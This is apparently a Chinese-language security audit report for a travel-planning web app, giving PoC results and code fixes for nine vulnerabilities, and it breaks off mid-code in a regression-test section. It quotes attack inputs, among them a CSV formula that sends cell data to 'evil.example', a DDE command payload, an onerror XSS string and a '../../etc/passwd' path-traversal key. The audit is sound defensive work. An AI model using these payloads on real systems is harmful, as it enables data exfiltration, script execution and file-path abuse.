# KAIROS V5.0 安全审计报告（Phase 3 — Security & D1 Concurrency Audit）

- **审计对象**：`world-travel-globe` (`KAIROS V5.0`，commit `cfec5a3` / tag `v5.0.0`)
- **审计日期**：2026-11-28
- **审计方法**：静态全源码走查 + 本地 `node:sqlite` (`DatabaseSync`，加载真实 `migrations/0001_init.sql`、`0002_backups.sql`、`0003_v5_accounts_collab.sql`) Worker PoC 复现 + 导出/存储可执行 PoC + 生产站点只读响应头与截图核验
- **证据文件**：[`security-poc-results.json`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/docs/audit-v5/evidence/security-poc-results.json) · [`issues.json`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/docs/audit-v5/issues.json)
- **安全发现汇总**：共确认 **2 个 P0**（`KAIROS-001`, `KAIROS-002`）与 **7 个 P1**（`KAIROS-008` ~ `KAIROS-014`），对应 [`security-poc-results.json`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/docs/audit-v5/evidence/security-poc-results.json) 中全部 9 组已验证漏洞（`VULN-01` ~ `VULN-09`）。**对全部 7 项前期安全疑点完成实证确认（7/7 Confirmed）**。

---

## 一、执行摘要与前期疑点实证结论

### 1.1 前期 7 项安全疑点逐一确认表

| 序号 | 前期安全疑点 | 实证结论 | 关联 Issue / PoC | 核心证据摘要 |
| --- | --- | --- | --- | --- |
| 1 | `POST /api/collab/trips` 缺少归属校验，可接管他人行程 | **已确认 (P0)** | `KAIROS-001` / `VULN-01` | 攻击者 Bob 提交 `trip.id = 'trip_alice_secret'` 返回 `201 {role:'owner'}`，覆盖 `trips` 并写入 `trip_members('owner')`，随后读取 Alice 私密评论/费用、恢复 v1 获取原行程并踢出 Alice（`200`）。 |
| 2 | `POST /api/collab/join/:token` 可将现有 Owner 降级为 Viewer/Editor | **已确认 (P0)** | `KAIROS-002` / `VULN-04` | Owner Alice 接受自己的 `viewer` 邀请后，`trip_members.role` 由 `owner` 被 `ON CONFLICT DO UPDATE` 覆盖为 `viewer`，后续邀请与 `PUT` 均返回 `403`。 |
| 3 | 公开分享泄露 PII，非成员可跨行程投票与刷评论 | **已确认 (P1)** | `KAIROS-008` / `VULN-02` | 未登录 `GET /api/collab/trips/trip_pub_1` 返回 `alice.pii@example.com` 及全部 `expenses`/`votes`；非成员 Carol 可评论（`201`），且能借公开 `tripId` 给私有行程 `trip_priv_target` 的 `pollId` 投票（`200`）。 |
| 4 | `PUT /api/collab/trips/:id` 缺乏乐观并发锁导致覆盖丢失 | **已确认 (P1)** | `KAIROS-009` / `VULN-03` | Bob 携带陈旧 `version: 1` 对服务端 `version: 2` 发起 `PUT`，返回 `200 {version: 3}` 并静默覆盖 Alice 的修改。 |
| 5 | `worker/collab.js` 缺少 CSRF 校验且全局 CORS 过宽 | **已确认 (P1)** | `KAIROS-010` / `VULN-05` | 携带 `Origin: https://evil.attacker` 的 `POST /api/collab/trips` 返回 `201`；`POST /api/auth/logout` 省略 `Origin`/`Referer` 返回 `200`；`OPTIONS` 与 `/api/profile` 返回 `Access-Control-Allow-Origin: *`。 |
| 6 | Auth 生命周期缺陷：改密未踢会话、OAuth 预接管、限流可绕过、删号留孤儿 | **已确认 (P1)** | `KAIROS-011` / `VULN-06` | `reset-password` 后旧 cookie 仍 `authenticated: true`；`request-reset` 15 次零 `429`；登录自己账号清零同 IP 计数器完成 27 次暴破无 `429`；OAuth 接受 `verified_email:false` 且保留预置密码；`DELETE /api/account` 留孤儿行；`avatarUrl` 接受 `data:image/svg+xml`。 |
| 7 | 登出/删号后本地数据残留导致跨用户泄密，及导出注入/代理 XSS/R2 越权 | **已确认 (P1)** | `KAIROS-012`, `KAIROS-013`, `KAIROS-014` / `VULN-07~09` | User B 同浏览器登录后读取 User A 的 `cloudSyncPassphrase` 并导入 A 的行程；3 个 CSV 导出器均未防公式注入，`toPrintableHtml` 未转义 `s.startTime`；`/api/img` 返回无 `sandbox` 的 SVG，`/api/photos` 无认证且 `X-Sync-Key` 可路径穿越 `../../etc/passwd`。 |

---

## 二、Phase 3 十五大安全域全量审计矩阵

> 注：Phase 3 要求覆盖的 15+ 个安全控制域如下表逐一给出审计状态、涉及文件行号、PoC 结果与问题编号。

| 序号 | 安全审计域 | 结论 | 严重度 | 涉及位置 | 关联编号 |
| --- | --- | --- | --- | --- | --- |
| 1 | **XSS（跨站脚本攻击）** | 存在风险 | **P1** | `js/lazy/export-service.js:199-208,233-245`; `worker/index.js:158-198,585-604`; `worker/auth.js:566-569` | `KAIROS-013`, `KAIROS-014`, `KAIROS-011` |
| 2 | **CSRF（跨站请求伪造）与 CORS** | 存在风险 | **P1** | `worker/collab.js:27-36`; `worker/auth.js:94-117`; `worker/index.js:9-18,67-68` | `KAIROS-010` |
| 3 | **SQL 注入（SQLi）** | **通过（未发现）** | — | `worker/auth.js`, `worker/collab.js`, `worker/index.js` 全部 `.prepare().bind()` | — |
| 4 | **IDOR 与访问控制失效（Broken Access Control）** | **严重漏洞** | **P0 / P1** | `worker/collab.js:12-25,38-83,192-230,261-274` | `KAIROS-001`, `KAIROS-002`, `KAIROS-008` |
| 5 | **认证与会话生命周期（Auth & Session Lifecycle）** | 存在风险 | **P1** | `worker/auth.js:143-188,365-374,658-664`; `migrations/0003_v5_accounts_collab.sql:121,149` | `KAIROS-011` |
| 6 | **OAuth 账号关联（OAuth Account Linking）** | 存在风险 | **P1** | `worker/auth.js:449-533` | `KAIROS-011` |
| 7 | **密码重置与会话吊销（Password Reset & Revocation）** | 存在风险 | **P1** | `worker/auth.js:425-447` | `KAIROS-011` |
| 8 | **Cookie 安全属性（Cookie Flags）** | 部分缺陷 | **P1** | `worker/auth.js:68-79,466` | `KAIROS-011`, `KAIROS-010` |
| 9 | **邮件验证、重放与重置限流（Email Verify & Replay）** | 部分缺陷 | **P1** | `worker/auth.js:291-303,376-423` | `KAIROS-011` |
| 10 | **CF 多 Isolate 限流（Rate Limiting in CF Multi-Isolate）** | 存在绕过 | **P1** | `worker/index.js:5-7,30-40`; `worker/auth.js:13,119-133,345` | `KAIROS-011` |
| 11 | **本地用户数据隔离（User Data Isolation）** | 存在泄露 | **P1** | `js/lazy/account-center.js:245-249`; `js/services/auth-service.js:63-73`; `js/services/storage-db.js:522-539` | `KAIROS-012` |
| 12 | **公开分享 PII 泄露（Public Share PII Leaks）** | 存在泄露 | **P1** | `worker/collab.js:100-121`; `worker/index.js:350-405` | `KAIROS-008`, `KAIROS-014` |
| 13 | **文件上传与 EXIF 剥离（File Upload & EXIF）** | 高危缺陷 | **P1** | `worker/index.js:407-418` | `KAIROS-014` |
| 14 | **CSV 公式注入（CSV Formula Injection）** | 存在漏洞 | **P1** | `js/lazy/export-service.js:19-23`; `js/modules/trip-planner.js:532-545`; `js/lazy/expense-splitter.js:84-89` | `KAIROS-013` |
| 15 | **API 密钥暴露（API Key Exposure）** | 服务端隔离合格 / 本地有残留 | **P1（关联）** | `worker/index.js:251-276,427-430`; `worker/auth.js:190-213`; `js/services/storage-db.js:522-539` | `KAIROS-012` |
| 16 | **DoS / 资源耗尽（DoS / Resource Exhaustion）** | 存在风险 | **P1** | `worker/index.js:7,407-418`; `worker/collab.js:49,130`; `worker/auth.js:13,395` | `KAIROS-011`, `KAIROS-014` |
| 17 | **Cloudflare D1 并发与事务一致性（D1 Concurrency & Tx）** | 存在缺陷 | **P1** | `worker/collab.js:51-61,124-140,261-274`; `worker/index.js:380-399`; `worker/auth.js:278-288,658-660` | `KAIROS-009`, `KAIROS-011`, `KAIROS-014` |

---

## 三、重点漏洞详述（PoC 证据、影响面与代码级修复）

### 3.1 `KAIROS-001` [P0] 协同行程创建接口无归属校验导致任意行程接管与数据窃取（`VULN-01`）

- **位置**：[`worker/collab.js:38-63`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L38-L63)、[`worker/collab.js:12-25`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L12-L25)、[`worker/collab.js:261-274`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L261-L274)
- **根因分析**：
  `POST /api/collab/trips` 直接取客户端传入的 `body.trip.id`，并执行：
  ```sql
  INSERT INTO trips (id, owner_id, title, access_mode, data_json, version, updated_at, created_at)
  VALUES (?, ?, ?, ?, ?, 1, ?, ?)
  ON CONFLICT(id) DO UPDATE SET title=excluded.title, access_mode=excluded.access_mode, data_json=excluded.data_json, updated_at=excluded.updated_at
  ```
  冲突更新语句未检查既有 `trips.owner_id === user.id`，紧接着 `INSERT OR IGNORE INTO trip_members (trip_id, user_id, role, joined_at) VALUES (?, ?, 'owner', ?)` 直接把攻击者写入 `trip_members` 作为 `'owner'`。
- **SQLite PoC 实测证据**（`security-poc-results.json -> VULN-01`）：
  1. Alice 创建私有行程 `trip_alice_secret`（内含评论 `"Alice private secret note: PIN 9988"`、费用 `{amount: 5000, note: "Private flight booking"}`、版本 1 `"Alice Private Honeymoon"`）。
  2. 攻击者 Bob 发送 `POST /api/collab/trips`，Body 为 `{"accessMode":"public","trip":{"id":"trip_alice_secret","name":"Hijacked by Bob"}}`。
  3. 响应返回 `201`：`{"ok":true,"tripId":"trip_alice_secret","role":"owner","version":1}`，数据库 `trips.title` 被覆写为 `"Hijacked by Bob"` 且 `access_mode` 改为 `"public"`（`owner_id` 虽仍为 Alice，但 `trip_members` 中 Bob 的 `role` 已是 `"owner"`）。
  4. Bob 随即调用 `GET /api/collab/trips/trip_alice_secret` 成功读出 Alice 全部私密评论与费用；调用 `POST .../versions/1/restore` 成功还原读出 `"Alice Private Honeymoon"`；调用 `DELETE .../members/<aliceId>` 返回 `200`，`aliceRemainingInTripMembers: null`，彻底将原主人踢出团队。
- **爆炸半径**：任何已登录用户只要知道或枚举出 `tripId`（例如从公开分享或 `trip_<base36>` 格式猜测），即可接管任意私有行程并窃取行程规划、评论与财务明细。
- **代码级修复方案**：
  在 `POST /api/collab/trips` 插入前查询已有行，若存在且 `owner_id !== user.id` 立即拒绝 `403`（或禁止 `POST` 指定冲突 ID，仅允许 `PUT` 更新），同时移除 `ON CONFLICT(id) DO UPDATE`：
  ```js
  const requestedId = trip.id ? String(trip.id).replace(/[^A-Za-z0-9_-]/g, '').slice(0, 80) : '';
  const tripId = requestedId || ('trip_' + randomBytesHex(8));
  const existing = await env.DB.prepare('SELECT owner_id FROM trips WHERE id = ?').bind(tripId).first();
  if (existing && existing.owner_id !== user.id) {
    return json({ ok: false, error: 'Trip ID already owned by another user' }, 403);
  }
  // 使用 env.DB.batch 原子写入，禁止跨 owner 覆写
  ```

---

### 3.2 `KAIROS-002` [P0] 接受邀请连接通过 `ON CONFLICT DO UPDATE` 将行程 Owner 降级为 Viewer（`VULN-04`）

- **位置**：[`worker/collab.js:66-83`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L66-L83)、[`worker/collab.js:12-25`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L12-L25)
- **根因分析**：
  `POST /api/collab/join/:token` 执行 `INSERT INTO trip_members ... ON CONFLICT(trip_id, user_id) DO UPDATE SET role=excluded.role`；而 `getMemberRole()` 在 `L14-22` 先查 `trip_members` 再查 `trips.owner_id`。当行程 Owner 误点自己生成的只读/编辑邀请链接（或被诱导点击链接）时，`trip_members.role` 被覆写为 `'viewer'`，`getMemberRole()` 优先返回 `'viewer'` 从而覆盖 `trips.owner_id` 判定。
- **SQLite PoC 实测证据**（`VULN-04`）：
  - `roleBefore: "owner"` → Owner Alice 调用 `POST /api/collab/join/9481cda8cf1b18d1abf911b7c8ba1985` → 返回 `{"ok":true,"tripId":"trip_demote","role":"viewer"}` → `roleAfter: "viewer"` → 随后 Alice 调用邀请与 `PUT` 接口分别返回 `ownerCreateInviteAfterStatus: 403`、`ownerEditTripAfterStatus: 403`。
- **代码级修复方案**：
  1. `getMemberRole()` 优先判断 `trips.owner_id === userId` 返回 `'owner'`。
  2. `POST /api/collab/join/:token` 查询行程 `owner_id`，若 `trip.owner_id === user.id` 直接返回 `{ ok: true, tripId: link.resource_id, role: 'owner' }`；在 `ON CONFLICT` 中增加 `WHERE trip_members.role != 'owner'`（且不把已有 `'editor'` 意外降级为 `'viewer'`）。

---

### 3.3 `KAIROS-008` [P1] 公开行程 PII 泄露与非成员跨行程投票篡改（`VULN-02`）

- **位置**：[`worker/collab.js:23`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L23)、[`worker/collab.js:94-121`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L94-L121)、[`worker/collab.js:192-230`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L192-L230)
- **根因分析**：
  1. `GET /api/collab/trips/:id` 在 `L103` 查询 `u.email` 并直接下发 `members`、`expenses`、`comments`、`votes` 给所有公开行程匿名访问者。
  2. `POST .../comments`（`L193`）与 `POST .../polls/:pollId/vote`（`L220`）仅判断 `if (!user)`，既未限制公开行程匿名/非成员的写权限，也未校验 `pollId` 是否属于路径中的 `tripId`。
- **SQLite PoC 实测证据**（`VULN-02`）：
  - 未登录访问 `GET /api/collab/trips/trip_pub_1` 返回 `200`，响应中包含 `leakedEmails: ["alice.pii@example.com"]`、`leakedExpensesCount: 1`、`leakedCommentsCount: 1`、`leakedVotesCount: 1`。
  - 非成员 Carol 对公开行程发评论返回 `201`，投票返回 `200`；更严重的是 Carol 通过 `POST /api/collab/trips/trip_pub_1/polls/<privPollId>/vote` 成功向**私有行程** `trip_priv_target` 写入投票（`crossTripPrivatePollVoteStatus: 200`）。
- **代码级修复方案**：
  - `GET` 查询仅在 `role === 'owner' || isExplicitMember` 时返回 `u.email` 与 `expenses`；对公开访客（`!isExplicitMember`）脱敏 `members`（仅保留 `display_name` 和 `role`）并剥离个人消费明细。
  - `POST .../comments` 与 `POST .../polls/:pollId/vote` 要求必须是显式 `trip_members`（或 `owner`）；投票前强制执行：
    ```sql
    SELECT id, options_json, status FROM polls WHERE id = ? AND trip_id = ?
    ```
    并校验 `status === 'open'` 及 `optIdx < options.length`。

---

### 3.4 `KAIROS-009` [P1] D1 乐观并发锁缺失与版本恢复时间线倒流（`VULN-03`）

- **位置**：[`worker/collab.js:124-140,261-274`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L124-L140)、[`worker/index.js:380-383`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/index.js#L380-L383)、[`js/services/storage-db.js:479-484`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/services/storage-db.js#L479-L484)
- **根因分析**：
  1. `PUT /api/collab/trips/:id` 直接 `UPDATE trips ... WHERE id = ?`，不校验客户端提交的 `baseVersion`（或 `body.version`）是否等于数据库当前 `version`。
  2. `POST .../versions/:ver/restore` 更新 `trips.data_json` 时未插入新的 `trip_versions` 历史行，也未递增 `data_json` 内的 `updatedAt`/`clock`。
  3. `/api/profile`（`worker/index.js:380-381`）使用 `if (existing && baseUpdatedAt && ...)`，若客户端省略 `X-Base-Updated-At` 或传入 `0`，冲突检查直接跳过。
  4. `StorageDB.restoreLatestBackupSnapshot` 使用 `importOpts = { preserveTimestamp: true }`，恢复后记录仍携带旧 `updatedAt`，下次同步会被更新的远端记录覆盖。
- **SQLite PoC 实测证据**（`VULN-03` & `algorithm-audit-results.json`）：
  - Alice `PUT` 升至 `version: 2` 后，Bob 提交 `version: 1` 的陈旧载荷，返回 `200 {version: 3}`，`finalTripName: "Bob Stale Edit (clobbers Alice)"`。
  - 备份恢复验证 `restoreLostToOlderClock: true`。
- **代码级修复方案**：
  - `PUT /api/collab/trips/:id` 要求客户端传 `baseVersion`，SQL 改为 `UPDATE trips SET ... WHERE id = ? AND version = ?`，当 `result.meta.changes === 0` 返回 `409 Conflict` 并附带最新服务端 `trip` 与 `version`。
  - `/api/profile` `PUT` 在 `existing` 存在时强制要求 `X-Base-Updated-At` 存在且与 `existing.updated_at` 相等（仅首次上传允许缺省）。
  - 版本/备份恢复时将 `updatedAt = Date.now()` 推进并递增 `logicalClock`，同时追加写入一条新的 `trip_versions` 快照。

---

### 3.5 `KAIROS-010` [P1] 协同路由未接入 CSRF 防护、空 Origin 放行与全局通配符 CORS（`VULN-05`）

- **位置**：[`worker/collab.js:27-36`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/collab.js#L27-L36)、[`worker/auth.js:94-117`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/auth.js#L94-L117)、[`worker/index.js:9-18,67-68`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/index.js#L9-L18)
- **根因分析**：
  - `handleCollabRequest` 全程未调用 `verifyCsrf(request)`；而 `verifyCsrf` 在同时无 `Origin` 与 `Referer` 时返回 `true`（`L116`），虽有 `SameSite=Lax`，但无法抵御同站子域（如 `<user>.workers.dev` 或被控同父域子站）或隐私策略剥离 Referer 后的表单/顶层 POST 攻击。
  - `worker/index.js:12` 对所有 `OPTIONS` 及 `jsonResponse` 默认返回 `Access-Control-Allow-Origin: *`，并允许 `Authorization, X-Sync-Key, X-Base-Updated-At`。
- **PoC 实测证据**（`VULN-05`）：
  - `POST /api/auth/logout` 携带 `Origin: https://evil.attacker` 被拒绝 `403`，但 `POST /api/collab/trips` 携带同一恶意 `Origin` 却返回 `201`（`collabCrossOriginStatus: 201`）；省略 `Origin` 与 `Referer` 的 `POST /api/auth/logout` 返回 `200`。
  - `OPTIONS /api/collab/trips` 与 `OPTIONS /api/profile` 均返回 `Access-Control-Allow-Origin: *`。
- **代码级修复方案**：
  - 在 `handleCollabRequest` 入口及 `/api/profile`、`/api/photos` 写操作前统一调用 `verifyCsrf(request)`。
  - `verifyCsrf` 对带 Cookie 会话的非幂等请求（`POST/PUT/PATCH/DELETE`）严格校验：`Sec-Fetch-Site` 若存在须为 `same-origin`，且必须存在与 `url.origin` 一致的 `Origin` 或 `Referer`（不再无条件返回 `true`）。
  - `/api/auth/*`、`/api/account*`、`/api/collab/*`、`/api/profile` 与 `/api/photos` 禁止通配符 `Access-Control-Allow-Origin: *`，仅公共只读代理端点保留必要 CORS。

---

### 3.6 `KAIROS-011` [P1] 认证与账号生命周期多重高危缺陷（`VULN-06`）

- **位置**：[`worker/auth.js:119-133,345,394-523,567,658-664`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/auth.js#L119-L133)、[`migrations/0003_v5_accounts_collab.sql:4,121,149`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/migrations/0003_v5_accounts_collab.sql#L4)
- **PoC 逐项实测结果**（`VULN-06`）：
  1. **密码重置不吊销现有会话**：Alice 登录后重置密码，`POST /api/auth/reset-password` 返回 `200`，但重置前签发的 `kairos_session` 调用 `GET /api/auth/me` 仍返回 `oldSessionAuthenticatedAfterReset: true`。
  2. **重置邮件端点无计数限流**：`POST /api/auth/request-reset`（`L395`）调用 `checkAuthRateLimit(ip, false)` 未累计失败/请求次数，连续 15 次请求 `requestReset15CallsRateLimited: false`。
  3. **跨账号清零 IP 暴破计数器**：对受害者邮箱连续猜错 9 次后，攻击者在同一 IP 下登录自己账号触发 `clearAuthFailures(ip)`（`L345`），循环 3 轮完成 **27 次**暴力破解零 `429`（`bruteForceBypassedAttemptsWithout429: 27`）。此外，内存 `authFailures = new Map()` 在 Cloudflare 多 Isolate 下本身互不共享。
  4. **Google OAuth 预接管与未加密 State Cookie**：`GET /api/auth/google`（`L466`）下发 `kairos_oauth_state` 缺少 `Secure` 标志（`oauthStateCookieMissingSecure: true`）；回调（`L496-523`）未校验 `gUser.verified_email === true`（`oauthCallbackAcceptedUnverifiedEmail: true`），且当邮箱已被攻击者提前注册（未验证密码账号）时，OAuth 登录后未重置/清除 `password_hash`，攻击者仍可用原密码登录受害者账号（`attackerPasswordStillWorksAfterOAuth: true`）。
  5. **注销账号遗留孤儿数据**：`DELETE /api/account`（`L658-660`）仅删除 `sessions` 与 `users`。在 D1 每条独立语句或未执行 `PRAGMA foreign_keys = ON` 的 SQLite 连接上，PoC 验证遗留 `trips: 1, comments: 1, expenses: 1, tripVersions: 1`；且 `0003_v5_accounts_collab.sql` 中 `trip_versions.author_id` 与 `expenses.payer_id` 根本未建外键约束。
  6. **SVG 头像 Data URL**：`PUT /api/account/profile`（`L567`）允许 `data:image/svg+xml;...`（`svgDataUrlAvatarAcceptedStatus: 200`）。
  - *注*：正面核验 `RESEND_API_KEY` 与 `GOOGLE_CLIENT_SECRET` 均未在响应中泄露（`noResendTokenLeakedInResponse: false`）。
- **代码级修复方案**：
  - `reset-password` 后立即执行 `DELETE FROM sessions WHERE user_id = (SELECT id FROM users WHERE email = ?)`。
  - 登录限流键改为 `ip + ':' + email`（保留全局 IP 上限，同时仅清除 `ip + ':' + email` 自己的成功记录），并接入 Cloudflare Rate Limiting binding / Turnstile / Durable Object 消除多 Isolate 漂移；`request-reset` 实施独立邮箱冷却与 IP 计数。
  - Google OAuth 强制 `if (gUser.verified_email !== true) return authJson(..., 403)`；`kairos_oauth_state` 在 HTTPS 下附加 `Secure`；若绑定既有未验证账号（`existing.email_verified === 0`），强制清除原 `password_hash`/`password_salt`、吊销所有旧 `sessions` 并置 `email_verified = 1`。
  - `DELETE /api/account` 使用 `env.DB.batch([...])` 显式按顺序清理 `poll_votes`、`polls`、`comments`、`expenses`、`trip_versions`、`trip_stops`、`trip_members`、`shared_links`、`trips`、`travel_records`、`wishlists`、`favorites`、`media_assets`、`accounts`、`user_preferences`、`sessions`、`users`（并在每次关键批处理启用外键或独立清理）。
  - `avatarUrl` 严格白名单限制为 `https://` 或安全栅格 Data URL（`/^data:image\/(png|jpeg|jpg|webp|gif);base64,/i`），明确禁止 `image/svg+xml`。

---

### 3.7 `KAIROS-012` [P1] 登出/删号未清理本地档案导致跨用户隐私泄露与错误数据合并（`VULN-07`）

- **位置**：[`js/lazy/account-center.js:245-249`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/lazy/account-center.js#L245-L249)、[`js/services/auth-service.js:63-73,91-100`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/services/auth-service.js#L63-L73)、[`js/services/storage-db.js:522-539`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/services/storage-db.js#L522-L539)、[`worker/auth.js:598-634`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/auth.js#L598-L634)
- **根因分析**：
  1. 共享浏览器上，`WorldTravelGlobeDB`（IndexedDB）与 `localStorage`（`wtg_collab_spaces_v1`、`wtg_favorites_v1`）无 `userId` 命名空间隔离。
  2. `account-center.js:246` 登出时显式传 `{ wipeAccountLocal: false }`；`AuthService.deleteAccount()` 根本不调用本地清理；即使调用 `StorageDB.wipeAllUserData(true)`，该方法（`L522-539`）也只清 5 张业务表，跳过 `settings` 表（导致 `cloudSyncPassphrase`、`mapillaryToken`、`orsApiKey` 持久保留）与 `localStorage`。
- **PoC 实测证据**（`VULN-07`）：
  - Alice 在本地保存心愿单 `"Alice secret diary note"`、行程 `"Alice Secret Trip"`（ID 与 Bob 云端行程碰撞）及 `cloudSyncPassphrase: "alice-secret-passphrase"` 后退出。
  - Bob 同浏览器登录并触发 `migrateLocalArchive()`，结果 `bobMigratedCount: 2`：Bob 的云端导出直接包含 Alice 的日记与行程（`bobExportedAliceWishlistNote: "Alice secret diary note"`、`bobExportedAliceTripTitle: "Alice Secret Trip"`），且 `aliceCloudSyncPassphraseStillReadableLocally: "alice-secret-passphrase"` 仍可读。
- **代码级修复方案**：
  - 将 IndexedDB 与 `localStorage` 按 `userId` 分库/分前缀（`WorldTravelGlobeDB_${userId}` 与 `guest` 隔离区）。
  - `logout` 与 `deleteAccount` 必须清除当前登录用户的本地凭据/密语（`cloudSyncPassphrase` 等 `LOCAL_ONLY_KEYS`）及缓存的用户数据，或弹窗强制选择“切换账号并清除本机缓存”。
  - `migrateLocalArchive()` 仅迁移 `guest` 命名空间数据，且若检测到上次 `wtg_last_synced_user_id !== currentUser.id`，禁止静默导入。

---

### 3.8 `KAIROS-013` [P1] 全线 CSV 公式注入与 Printable HTML 导出同源 DOM XSS（`VULN-08`）

- **位置**：[`js/lazy/export-service.js:19-23,199-208,233-245`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/lazy/export-service.js#L19-L23)、[`js/modules/trip-planner.js:532-545`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/modules/trip-planner.js#L532-L545)、[`js/lazy/expense-splitter.js:84-89`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/js/lazy/expense-splitter.js#L84-L89)
- **根因分析**：
  1. `ExportService.csvCell()`、`TripPlanner.tripToCsv()`、`ExpenseSplitter.settlementsToCsv()` 仅转义双引号与换行，未对公式触发前缀（`=`, `+`, `-`, `@`, `\t`, `\r`）做前置引号/单引号中和。
  2. `ExportService.toPrintableHtml()`（`L202`）对 `s.name`、`s.note` 使用了 `escXml()`，但唯独漏掉 `s.startTime`（`<td>${s.startTime}</td>`），而 `exportTrip('pdf')` 通过 `window.open('', '_blank').document.write(html)` 将结果直接写入**同源窗口**（可读写同一 Origin 的 `IndexedDB` 与 `localStorage`）。
- **可执行 PoC 实测证据**（`VULN-08`）：
  - `exportServiceCsvSample` 原样输出 `=HYPERLINK("https://evil.example?leak="&A1,"Click")` 与 `+cmd|' /C calc'!A0`；`tripPlannerCsvHasUnescapedFormula: true`；`expenseSplitterCsvHasUnescapedFormula: true`。
  - `printableHtmlRawInjection`: `<td>09:00<img src=x onerror=alert("XSS_startTime")></td>`。
- **代码级修复方案**：
  ```js
  function safeCsvCell(v) {
    let s = String(v == null ? '' : v);
    if (/^[\s\t\r]*[=+\-@]/.test(s)) s = "'" + s;
    if (/[",\r\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
    return s;
  }
  ```
  并在 `toPrintableHtml()` 第 202 行将 `${s.startTime}` 改为 `${escXml(s.startTime)}`，导出独立 HTML 建议增加 `<meta http-equiv="Content-Security-Policy" content="script-src 'none'">`（打印窗口如无需脚本亦应隔离为 `Blob URL` + `noopener` 或无脚本 CSP）。

---

### 3.9 `KAIROS-014` [P1] Worker 代理 Content-Type 透传 XSS、R2 无鉴权路径穿越与弱 CSP（`VULN-09`）

- **位置**：[`worker/index.js:20-28,52-58,131-198,236-243,346-418,585-604`](file:///c:/Users/Liam/Desktop/旅游计划/globe-app/worker/index.js#L158-L198)
- **PoC 与线上响应头实测证据**（`VULN-09`）：
  1. **同源代理 XSS 风险**：`/api/img`（`L182-193`）仅校验 `ct.startsWith('image/')`，直接返回 `image/svg+xml` 且无 `Content-Security-Policy: sandbox` 与 `X-Content-Type-Options: nosniff`（`apiImgSvgContentType: "image/svg+xml"`, `apiImgHasCspOrNosniff: false`）；`/api/commons`（如 `format=jsonfm`）与 `/api/tile/*` 错误页原样透传 `text/html; charset=utf-8`（`apiCommonsJsonfmContentType`, `apiTileErrorContentType`）。
  2. **R2 相册上传无鉴权与路径穿越**：`/api/photos`（`L407-418`）未调用 `getSessionUser`，匿名请求可直接上传并写入 `anon/...`（`apiPhotosUnauthStatus: 201`）；未校验 `X-Sync-Key` 字符集，`X-Sync-Key: ../../etc/passwd` 写入 `../../etc/passwd/mwzwqu7i.jpg`（`apiPhotosTraversalKey`）；未校验文件大小（DoS）与 JPEG/PNG/WebP 魔数，且未剥离照片 EXIF GPS 位置隐私。
  3. **`/api/profile` 弱同步锁与备份残留**：`syncKey.length < 16` 允许低熵弱密钥；`X-Base-Updated-At` 省略或传 `0` 绕过 `409` 乐观锁（`apiProfileOmittedBaseOverwriteStatus: 200`）；`DELETE /api/profile` 未清理 `profile_backups`（`apiProfileBackupStillExistsAfterDelete: true`）。
  4. **过宽 HTML CSP**：线上实测 `GET /` 仅返回 `Content-Security-Policy: frame-ancestors *`（无 `script-src`、`object-src`、`base-uri`），仅当 URL 显式包含 `?mode=account` 或 `archive` 时才设 `frame-ancestors 'none'`，但普通 `/` 页面上同样可弹出 `#account-modal` 与协同面板，存在点击劫持风险。
- **代码级修复方案**：
  - `/api/img` 禁止 `image/svg+xml`（只允许 `image/jpeg|png|webp|gif|avif`）并附加 `X-Content-Type-Options: nosniff` + `Content-Security-Policy: sandbox; default-src 'none'`；`/api/commons`/`wikidata`/`wikipedia` 强制校验响应为 `application/json` 或拒绝透传 `text/html`；`/api/tile/*` 校验 `ct.startsWith('image/')`。
  - `/api/photos` 强制要求登录态（`getSessionUser`），R2 key 使用服务端生成的 `photos/${user.id}/${randomBytesHex(16)}.jpg`，限制 `bytes.byteLength <= 5 * 1024 * 1024` 并校验 JPEG/PNG/WebP Magic Bytes，客户端上传前通过 Canvas 重绘剥离 EXIF 并在元数据标注。
  - `DELETE /api/profile` 同步删除 `profile_backups`。
  - HTML 响应默认设置 `frame-ancestors 'self'`（仅在显式 `?embed=1` 且移除账号敏感 UI 时放行所需来源），并补齐 `base-uri 'self'; object-src 'none'`。

---

## 四、`node:sqlite` 自动化回归测试设计

建议在 `tests/security-regression.test.js` 中替换现有的正则模拟 `MockD1`，直接使用 Node.js 内置 `node:sqlite` (`DatabaseSync`) 加载 `migrations/0001~0003.sql` 对真实 `handleAuthRequest`、`handleCollabRequest` 与 `worker/index.js` 运行回归门禁：

```js
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { DatabaseSync } from 'node:sqlite';
import { handleAuthRequest } from '../worker/auth.js';
import { handleCollabRequest } from '../worker/collab.js';

function createD1Adapter() {
  const db = new DatabaseSync(':memory:');
  db.exec('PRAGMA foreign_keys = ON;');
  for (const m of ['0001_init.sql', '0002_backups.sql', '0003_v5_accounts_collab.sql']) {
    db.exec(fs.readFileSync(new URL(`../migrations/${m}`, import.meta.url), 'utf8'));
  }
  return {
    db,
    prepare(sql) {
